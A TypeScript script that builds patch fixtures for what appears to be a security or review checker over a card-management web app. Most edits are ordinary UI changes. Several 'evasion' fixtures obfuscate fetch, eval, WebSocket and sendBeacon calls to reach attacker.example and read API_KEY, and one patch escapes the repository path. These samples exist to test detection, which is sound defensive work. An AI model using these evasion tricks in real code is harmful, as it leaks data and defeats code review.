/**
 * Regenerates every committed fixture diff from search/replace edits against the current target-app tree.
 * Each edit asserts its search text exists, so fixtures fail loudly instead of drifting silently.
 *
 *   pnpm tsx scripts/make-fixture-diffs.ts
 */
import { readFileSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { createTwoFilesPatch } from "diff";
import { REPO_ROOT, TARGET_ROOT } from "../src/config";

type Edit =
  | { path: string; replace: [string, string][] }
  | { path: string; create: string }
  | { path: string; rawPatch: string };

interface FixtureDiff {
  name: string;
  out: "diffs" | "recorded";
  edits: Edit[];
}

function apply(path: string, replacements: [string, string][]): string {
  let text = readFileSync(join(TARGET_ROOT, path), "utf8");
  for (const [search, replacement] of replacements) {
    if (!text.includes(search)) {
      throw new Error(`fixture edit for ${path}: search text not found:\n${search}`);
    }
    text = text.replace(search, replacement);
  }
  return text;
}

function patchFor(edit: Edit): string {
  if ("rawPatch" in edit) {
    return edit.rawPatch;
  }
  if ("create" in edit) {
    return createTwoFilesPatch("/dev/null", `b/${edit.path}`, "", edit.create, undefined, undefined, { context: 3 });
  }
  const before = readFileSync(join(TARGET_ROOT, edit.path), "utf8");
  return createTwoFilesPatch(
    `a/${edit.path}`,
    `b/${edit.path}`,
    before,
    apply(edit.path, edit.replace),
    undefined,
    undefined,
    {
      context: 3,
    },
  );
}

const PANEL = "src/ui/cards/CardSettingsPanel.tsx";
const EMPTY = "src/ui/cards/CardEmptyState.tsx";

const fixtures: FixtureDiff[] = [
  {
    name: "R1",
    out: "recorded",
    edits: [
      {
        path: EMPTY,
        replace: [
          [
            `      <p style={text.body}>You don't have any company cards.</p>\n`,
            [
              `      <p style={text.body}>`,
              `        Company cards let you pay for work purchases without spending your own money or waiting for a`,
              `        reimbursement.`,
              `      </p>`,
              `      <p style={text.muted}>Your company admin approves new card requests, usually within one working day.</p>`,
              ``,
            ].join("\n"),
          ],
        ],
      },
    ],
  },
  {
    name: "R2",
    out: "recorded",
    edits: [
      {
        path: PANEL,
        replace: [
          [
            `import type { Card } from "../../types/card";\n`,
            `import { fromMinorUnits, toMinorUnits } from "../../lib/money";\nimport type { Card } from "../../types/card";\n`,
          ],
          [
            `  const [onlineEnabled, setOnlineEnabled] = useState(card.onlineEnabled);\n`,
            [
              `  const [onlineEnabled, setOnlineEnabled] = useState(card.onlineEnabled);`,
              `  const [transactionLimit, setTransactionLimit] = useState(`,
              `    card.transactionLimit ? fromMinorUnits(card.transactionLimit.amountMinor) : "",`,
              `  );`,
              ``,
            ].join("\n"),
          ],
          [
            `    event.preventDefault();\n    setSaving(true);\n`,
            [
              `    event.preventDefault();`,
              `    const limitMinor = transactionLimit.trim() === "" ? null : toMinorUnits(transactionLimit);`,
              `    if (transactionLimit.trim() !== "" && limitMinor === null) {`,
              `      setError("Enter the limit as an amount, for example 150,00");`,
              `      return;`,
              `    }`,
              `    setSaving(true);`,
              ``,
            ].join("\n"),
          ],
          [
            `      const updated = await updateCardSettings(card.id, { nickname, onlineEnabled });\n`,
            [
              `      const updated = await updateCardSettings(card.id, {`,
              `        nickname,`,
              `        onlineEnabled,`,
              `        transactionLimit: limitMinor === null ? null : { amountMinor: limitMinor, currency: "EUR" },`,
              `      });`,
              ``,
            ].join("\n"),
          ],
          [
            `        <FreezeCardToggle cardId={card.id} frozen={card.status === "frozen"} />\n`,
            [
              `        <Field`,
              `          label="Per-transaction limit (EUR)"`,
              `          htmlFor="card-transaction-limit"`,
              `          hint="Leave empty for no per-transaction limit."`,
              `        >`,
              `          <TextInput`,
              `            id="card-transaction-limit"`,
              `            value={transactionLimit}`,
              `            onChange={setTransactionLimit}`,
              `            inputMode="decimal"`,
              `            placeholder="No limit"`,
              `          />`,
              `        </Field>`,
              `        <FreezeCardToggle cardId={card.id} frozen={card.status === "frozen"} />`,
              ``,
            ].join("\n"),
          ],
        ],
      },
    ],
  },
  {
    name: "R3",
    out: "recorded",
    edits: [
      {
        path: PANEL,
        replace: [
          [
            `import { FreezeCardToggle } from "./FreezeCardToggle";\n`,
            `import { FreezeCardToggle } from "./FreezeCardToggle";\nimport { useAvailableBalance } from "./useAvailableBalance";\n`,
          ],
          [
            `  const [error, setError] = useState<string | null>(null);\n`,
            `  const [error, setError] = useState<string | null>(null);\n  const availableBalance = useAvailableBalance(card.id);\n`,
          ],
          [
            `        <FreezeCardToggle cardId={card.id} frozen={card.status === "frozen"} />\n`,
            [
              `        {availableBalance ? (`,
              `          <Field label="Available balance" htmlFor="card-available-balance">`,
              `            <Money id="card-available-balance" amount={availableBalance} />`,
              `          </Field>`,
              `        ) : null}`,
              `        <FreezeCardToggle cardId={card.id} frozen={card.status === "frozen"} />`,
              ``,
            ].join("\n"),
          ],
        ],
      },
      {
        path: "src/ui/cards/useAvailableBalance.ts",
        create: [
          `import { useEffect, useState } from "react";`,
          `import type { Money } from "../../types/money";`,
          ``,
          `/** Loads the cardholder's available balance for display on the settings panel. */`,
          `export function useAvailableBalance(cardId: string): Money | null {`,
          `  const [balance, setBalance] = useState<Money | null>(null);`,
          `  useEffect(() => {`,
          `    let cancelled = false;`,
          "    fetch(`/api/v2/balance?cardId=${cardId}`)",
          `      .then((response) => response.json())`,
          `      .then((data) => {`,
          `        if (!cancelled) {`,
          `          setBalance({ amountMinor: data.available, currency: data.currency });`,
          `        }`,
          `      });`,
          `    return () => {`,
          `      cancelled = true;`,
          `    };`,
          `  }, [cardId]);`,
          `  return balance;`,
          `}`,
          ``,
        ].join("\n"),
      },
    ],
  },
  {
    name: "write-scope-ledger",
    out: "diffs",
    edits: [
      { path: "src/ledger/ledgerMath.ts", replace: [["let balance = 0;", "let balance = 0; // start from zero"]] },
    ],
  },
  {
    name: "write-scope-fixture",
    out: "diffs",
    edits: [
      {
        path: "src/ui/cards/CardSettingsPanel.fixture.tsx",
        replace: [['nickname: "Travel"', 'nickname: "Travel and meals"']],
      },
    ],
  },
  {
    name: "write-scope-outside",
    out: "diffs",
    edits: [
      {
        path: "src/api/cards.ts",
        replace: [["/** Freezes a card immediately. */", "/** Freezes a card immediately. Idempotent. */"]],
      },
    ],
  },
  {
    name: "write-scope-escape",
    out: "diffs",
    edits: [
      {
        path: "../package.json",
        rawPatch: ["--- /dev/null", "+++ b/../evil.ts", "@@ -0,0 +1,1 @@", "+export const pwned = true;", ""].join(
          "\n",
        ),
      },
    ],
  },
  {
    name: "ast-new-dependency",
    out: "diffs",
    edits: [
      {
        path: EMPTY,
        replace: [
          [
            `import { Button } from "../common/Button";\n`,
            `import confetti from "canvas-confetti";\nimport { Button } from "../common/Button";\n`,
          ],
          [`<Button onClick={onRequestCard}>`, `<Button onClick={() => { confetti(); onRequestCard(); }}>`],
        ],
      },
    ],
  },
  {
    name: "ast-dynamic-eval",
    out: "diffs",
    edits: [
      {
        path: EMPTY,
        replace: [
          [
            `<p style={text.body}>You don't have any company cards.</p>`,
            `<p style={text.body} dangerouslySetInnerHTML={{ __html: "You don't have <b>any</b> cards." }} />`,
          ],
        ],
      },
    ],
  },
  {
    name: "ast-suppression",
    out: "diffs",
    edits: [
      {
        path: "src/ui/cards/CardList.tsx",
        replace: [
          [
            `      {cards.map((card) => (\n`,
            `      {/* eslint-disable-next-line react/jsx-key */}\n      {cards.map((card) => (\n`,
          ],
          [`export function CardList(`, `// @ts-ignore legacy props\nexport function CardList(`],
        ],
      },
    ],
  },
  {
    name: "ast-banking-client",
    out: "diffs",
    edits: [
      {
        path: "src/ui/cards/CardListItem.tsx",
        replace: [
          [
            `import type { Card } from "../../types/card";\n`,
            `import { createBankingClient } from "../../banking/bankingClient";\nimport type { Card } from "../../types/card";\n`,
          ],
          [
            `export function CardListItem(`,
            `const banking = createBankingClient({ baseUrl: "/api/v1/banking" });\n\n/** Prefetches settlement status. */\nexport function prefetchSettlement(id: string) {\n  return banking.settlement(id);\n}\n\nexport function CardListItem(`,
          ],
        ],
      },
    ],
  },
  {
    name: "ast-env-access",
    out: "diffs",
    edits: [
      {
        path: "src/ui/cards/FreezeCardToggle.tsx",
        replace: [
          [
            `  const [isFrozen, setIsFrozen] = useState(frozen);\n`,
            `  const [isFrozen, setIsFrozen] = useState(frozen);\n  const enabled = process.env.FEATURE_FREEZE === "on";\n`,
          ],
        ],
      },
    ],
  },
  {
    name: "ast-preexisting-fetch",
    out: "diffs",
    edits: [
      {
        path: "src/api/client.ts",
        replace: [[`const BASE_PATH = "/api/v1";`, `const BASE_PATH = "/api/v1"; // versioned contract`]],
      },
    ],
  },
  {
    name: "contract-unknown-field",
    out: "diffs",
    edits: [
      {
        path: PANEL,
        replace: [
          [
            `updateCardSettings(card.id, { nickname, onlineEnabled })`,
            `updateCardSettings(card.id, { nickname, onlineEnabled, spendingCap: 100 })`,
          ],
        ],
      },
    ],
  },
  {
    name: "contract-wrong-method",
    out: "diffs",
    edits: [
      {
        path: "src/ui/cards/FreezeCardToggle.tsx",
        replace: [
          [
            `import { freezeCard, unfreezeCard } from "../../api/cards";\n`,
            `import { unfreezeCard } from "../../api/cards";\nimport { apiClient } from "../../api/client";\nimport type { Card } from "../../types/card";\n`,
          ],
          ["next ? await freezeCard(cardId) :", "next ? await apiClient.delete<Card>(`/cards/${cardId}/freeze`) :"],
        ],
      },
    ],
  },
  {
    name: "contract-literal-body",
    out: "diffs",
    edits: [
      {
        path: "src/ui/expenses/ExpenseForm.tsx",
        replace: [
          [
            `  return (\n    <Panel title="New expense">`,
            `  async function addSampleTaxi() {\n    onCreated(\n      await createExpense({\n        merchant: "Taxi Helsinki",\n        amount: { amountMinor: 1850, currency: "USD" },\n        category: "travel",\n        occurredAt: "2026-10-05T08:30:00Z",\n      }),\n    );\n  }\n\n  return (\n    <Panel title="New expense">`,
          ],
        ],
      },
    ],
  },
  {
    name: "contract-response-field",
    out: "diffs",
    edits: [
      {
        path: PANEL,
        replace: [
          [
            `      onSaved(updated);\n`,
            `      if (updated.pendingReview) {\n        setError("Changes are waiting for admin review");\n      }\n      onSaved(updated);\n`,
          ],
        ],
      },
    ],
  },
  {
    name: "visual-button-style",
    out: "diffs",
    edits: [{ path: "src/ui/common/Button.tsx", replace: [[`padding: "8px 14px",`, `padding: "10px 18px",`]] }],
  },
  {
    name: "evasion-bracket-fetch",
    out: "diffs",
    edits: [
      {
        path: "src/ui/cards/bracket_fetch.ts",
        create: `export function load(cardId: string) {\n  return window["fetch"](\`/api/v2/balance?cardId=\${cardId}\`);\n}\n`,
      },
    ],
  },
  {
    name: "evasion-self-fetch",
    out: "diffs",
    edits: [
      {
        path: "src/ui/cards/self_fetch.ts",
        create: `export function load(cardId: string) {\n  return self.fetch(\`/api/v2/balance?cardId=\${cardId}\`);\n}\n`,
      },
    ],
  },
  {
    name: "evasion-alias-fetch",
    out: "diffs",
    edits: [
      {
        path: "src/ui/cards/alias_fetch.ts",
        create: `const request = fetch;\n\nexport function load(cardId: string) {\n  return request(\`/api/v2/balance?cardId=\${cardId}\`);\n}\n`,
      },
    ],
  },
  {
    name: "evasion-bracket-eval",
    out: "diffs",
    edits: [
      {
        path: "src/ui/cards/bracket_eval.ts",
        create: `export function compute(): unknown {\n  return window["eval"]("1 + 1");\n}\n`,
      },
    ],
  },
  {
    name: "evasion-bracket-env",
    out: "diffs",
    edits: [
      {
        path: "src/ui/cards/bracket_env.ts",
        create: `declare const process: { env: Record<string, string | undefined> };\n\nexport const key = process["env"]["API_KEY"];\n`,
      },
    ],
  },
  {
    name: "evasion-bracket-xhr",
    out: "diffs",
    edits: [
      {
        path: "src/ui/cards/bracket_xhr.ts",
        create: `export function open(): XMLHttpRequest {\n  return new window["XMLHttpRequest"]();\n}\n`,
      },
    ],
  },
  {
    name: "evasion-computed-import",
    out: "diffs",
    edits: [
      {
        path: "src/ui/cards/computed_import.ts",
        create: `export function loadClient() {\n  return import(["ax", "ios"].join(""));\n}\n`,
      },
    ],
  },
  {
    name: "evasion-computed-websocket",
    out: "diffs",
    edits: [
      {
        path: "src/ui/cards/ws_probe.ts",
        create:
          'const name = "Web" + "Socket";\nconst Ctor = (globalThis as unknown as Record<string, new (url: string) => unknown>)[name];\n\nexport const probe = Ctor ? new Ctor("ws://attacker.example/exfil") : null;\n',
      },
    ],
  },
  {
    name: "evasion-import-escape",
    out: "diffs",
    edits: [
      {
        path: "src/ui/cards/import_escape.ts",
        create: 'import { REPO_ROOT } from "../../../../src/config";\n\nexport const leaked = REPO_ROOT;\n',
      },
    ],
  },
  {
    name: "evasion-reflect-global",
    out: "diffs",
    edits: [
      {
        path: "src/ui/cards/reflect_probe.ts",
        create:
          'const name = ["Web", "Socket"].join("");\nconst Ctor: unknown = Reflect.get(globalThis, name);\n\nexport const probe = typeof Ctor === "function" ? Reflect.construct(Ctor, ["ws://attacker.example/x"]) : null;\n',
      },
    ],
  },
  {
    name: "evasion-navigator-computed",
    out: "diffs",
    edits: [
      {
        path: "src/ui/cards/beacon_probe.ts",
        create:
          'const method = ["send", "Beacon"].join("");\n\nexport function leak(data: string): unknown {\n  return (navigator as unknown as Record<string, (url: string, body: string) => boolean>)[method]?.("https://attacker.example/b", data);\n}\n',
      },
    ],
  },
  {
    name: "risk-financial-endpoint",
    out: "diffs",
    edits: [
      {
        path: "src/ui/cards/FreezeCardToggle.tsx",
        replace: [
          [
            `import { freezeCard, unfreezeCard } from "../../api/cards";\n`,
            `import { freezeCard, getCard, unfreezeCard } from "../../api/cards";\n`,
          ],
          [
            `    setIsFrozen(card.status === "frozen");\n`,
            `    const fresh = await getCard(cardId);\n    setIsFrozen(fresh.status === "frozen");\n`,
          ],
        ],
      },
    ],
  },
  {
    name: "risk-medium-state",
    out: "diffs",
    edits: [
      {
        path: EMPTY,
        replace: [
          [
            `import { Button } from "../common/Button";\n`,
            `import { useState } from "react";\nimport { Button } from "../common/Button";\n`,
          ],
          [
            `export function CardEmptyState({ onRequestCard }: CardEmptyStateProps) {\n`,
            `export function CardEmptyState({ onRequestCard }: CardEmptyStateProps) {\n  const [dismissed, setDismissed] = useState(false);\n  if (dismissed) {\n    return null;\n  }\n`,
          ],
          [
            `      <Button onClick={onRequestCard}>Request a card</Button>\n`,
            `      <Button onClick={onRequestCard}>Request a card</Button>\n      <Button variant="secondary" onClick={() => setDismissed(true)}>\n        Not now\n      </Button>\n`,
          ],
        ],
      },
    ],
  },
];

for (const fixture of fixtures) {
  const patch = fixture.edits.map(patchFor).join("");
  const path = join(REPO_ROOT, "fixtures", fixture.out, `${fixture.name}.patch`);
  writeFileSync(path, patch);
  console.log(`wrote ${path}`);
}
